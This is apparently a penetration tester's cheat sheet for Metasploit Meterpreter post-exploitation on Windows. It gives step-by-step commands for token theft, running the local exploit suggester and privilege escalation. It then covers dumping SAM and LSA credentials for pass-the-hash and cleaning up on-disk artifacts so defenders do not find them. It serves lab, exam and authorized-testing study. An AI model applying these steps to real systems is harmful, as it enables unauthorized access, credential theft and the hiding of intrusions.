# Meterpreter — Post-Exploitation Flow

Set LHOST to interface name instead of IP — MSF resolves it automatically, no need to look up tun0's IP:

```
msf6 exploit(...)> set LHOST tun0
```

If `getuid` returns access denied, steal a token from a visible process instead of migrating blind — pick a process running as NETWORK SERVICE or higher:

```
meterpreter > ps
meterpreter > steal_token <PID>
meterpreter > getuid
```

Background session, run local exploit suggester, set SESSION, run — do this immediately after foothold before doing anything else:

```
meterpreter > bg
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(...)> set SESSION <ID>
msf6 post(...)> run
```

Pick a `The target appears to be vulnerable` result (not just "could not be validated"), set the same SESSION, run:

```
msf6 > use exploit/windows/local/<SUGGESTED_EXPLOIT>
msf6 exploit(...)> set SESSION <ID>
msf6 exploit(...)> set LHOST tun0
msf6 exploit(...)> run
```

Once SYSTEM — dump everything:

```
meterpreter > hashdump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

`lsa_dump_secrets` catches service account plaintext passwords (`_SC_` prefixed entries) — high value for lateral movement. `lsa_dump_sam` gives you LM+NTLM for every local account → PTH immediately.

> [!warning] WebDAV and similar upload exploits leave artifact files on disk when deletion fails (403 Forbidden is common). Check what the module writes and manually clean up via `shell` → `del` if MSF can't. Leaving a `metasploit<rand>.asp` on the target is a findable IOC.